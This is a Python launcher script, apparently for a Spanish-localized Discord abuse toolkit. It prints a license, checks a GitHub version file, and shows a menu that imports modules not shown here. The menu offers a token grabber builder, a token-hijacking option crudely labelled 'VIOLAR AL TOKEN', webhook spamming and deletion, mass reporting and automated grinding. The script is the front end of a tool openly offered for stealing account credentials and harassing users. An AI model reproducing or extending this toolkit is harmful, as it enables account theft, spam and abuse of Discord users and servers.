LICENSE = """
Copyright © 2025 rorod5#0000
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"""

import time
import os

print(LICENSE)

time.sleep(1)
os.system('cls' if os.name == 'nt' else 'clear')

print("Checking internal version with servers")
try:
    import requests
except ImportError as ex:
    input(f"Module {ex.name} not installed, to install run '{'python' if os.name == 'nt' else 'python3.8'} -m pip install {ex.name}'\nPress enter to exit")
    exit()

response = requests.get("https://raw.githubusercontent.com/logicguy1/The-all-in-one-discord-tool/main/version.txt")

with open("version.txt", "r") as file:
    curVersion = file.read().strip()

if response.status_code != 200:
    exit()

if curVersion != response.text.strip():
    print("WARNING: There is a newer version avaliable at \nhttps://github.com/logicguy1/The-all-in-one-discord-tool\nIt's highly recommended to update as soon as possible.\nThis message will dissapear in 5 seconds.")
    time.sleep(5)

try:
    import time
    import os
    from colored import fg, bg, attr
    import modules.massReport as massReport
    import modules.credits as credits
    import modules.tokenGrabber as grabber
    import modules.tokenRape as tokenRape
    import modules.historyClear as historyClear
    import modules.tokenWebhookChecker as checkers
    import modules.webhookSpammer as spammer
    import modules.autoBump as bumper
    import modules.dankMemer as memer
    import modules.serverLookup as serverLookup
except ImportError as ex:
    input(f"Module {ex.name} not installed, to install run '{'python' if os.name == 'nt' else 'python3.8'} -m pip install {ex.name}'\nPress enter to exit")
    exit()


r = fg(241) # Setup color variables
r2 = fg(255)
b = fg(31)
w = fg(15)
y = fg(3) + attr(1)
d = r2 + attr(21)

class Client:
    def __init__(self):
        modules = {
            "1" : {"function" : tokenRape.rape, "name" : "VIOLAR AL TOKEN"},
            "2" : {"function" : spammer.spammer, "name" : "Spammear El webhook kjj"},
            "3" : {"function" : checkers.token, "name" : "Chequear el token"},
            "4" : {"function" : checkers.webhook, "name" : "Chequear el webhook"},
            "5" : {"function" : checkers.webhook_deleter, "name" : "Eliminar el webhook"},
            "6" : {"function" : historyClear.clear, "name" : "Eliminar el historial"},
            "7" : {"function" : bumper.bumper, "name" : "AutoBump"},
            "8" : {"function" : grabber.create_grabber, "name" : "Token Grabber"},
            "9" : {"function" : memer.start, "name" : "DankMemerGrinder"},
            "10" : {"function" : serverLookup.fetch_data, "name" : "Lookupear el server"},
            "11" : {"function" : massReport.start, "name" : "Reportar masivamente"},
            "12" : {"function" : credits.show_credits, "name" : "Creditos"},
            "13" : {"function" : exit, "name" : "Leave"}
        }
        self.modules = modules

    def main(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f""" {r2} █████{b}╗{r2} ███{b}╗{r2}   ██{b}╗{r2} ██████{b}╗{r2} ███{b}╗{r2}   ██{b}╗{r2}██{b}╗{r2}██{b}╗{r2}  ██{b}╗{r2}
 ██{b}╔══{r2}██{b}╗{r2}████{b}╗  {r2}██{b}║{r2}██{b}╔═══{r2}██{b}╗{r2}████{b}╗  {r2}██{b}║{r2}██{b}║╚{r2}██{b}╗{r2}██{b}╔╝{r2}
 ███████{b}║{r2}██{b}╔{r2}██{b}╗ {r2}██{b}║{r2}██{b}║   {r2}██{b}║{r2}██{b}╔{r2}██{b}╗ {r2}██{b}║{r2}██{b}║ ╚{r2}███{b}╔╝{r2}
 ██{b}╔══{r2}██{b}║{r2}██{b}║╚{r2}██{b}╗{r2}██{b}║{r2}██{b}║   {r2}██{b}║{r2}██{b}║╚{r2}██{b}╗{r2}██{b}║{r2}██{b}║ {r2}██{b}╔{r2}██{b}╗{r2}
 ██{b}║  {r2}██{b}║{r2}██{b}║ ╚{r2}████{b}║╚{r2}██████{b}╔╝{r2}██{b}║ ╚{r2}████{b}║{r2}██{b}║{r2}██{b}╔╝ {r2}██{b}╗{r2}
 {b}╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝
{r2} * 	      Jaja Script todo skideado        *
""")
        indx = 0
        for key, val in self.modules.items():
            num = f"{r2}[{b}{key}{r2}]"
            print(
                f" {num:<6} {val['name']:<{20 if int(key) < 10 else 19}}",
                end = "" if indx % 2 == 0 else "\n"
            )
            indx += 1

        if indx % 2 == 1:
            print("")

        option = input(f"\n {r2}[{b}?{r2}] Option: ")

        data = self.modules[option]
        
        try:
            data["function"]()
        except KeyboardInterrupt:
            input(f"\n {r2}[{b}!{r2}] Keyboard Interrupt")
        else:
            input(f"\n {r2}[{b}!{r2}] Done! Press enter to continue")
        
        self.main()

if __name__ == '__main__':
    client = Client()
    client.main()
